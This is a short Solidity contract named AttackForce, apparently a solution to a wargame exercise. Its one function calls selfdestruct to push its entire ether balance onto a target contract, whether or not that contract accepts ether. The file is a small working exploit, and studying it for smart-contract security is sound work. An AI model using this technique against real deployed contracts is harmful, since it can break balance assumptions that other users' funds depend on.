// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract AttackForce {
    function attack(address contractToAttack) public payable{
        selfdestruct(payable(contractToAttack)); // this is address that will recive all funds of this contract after it is destroyed
    }
}
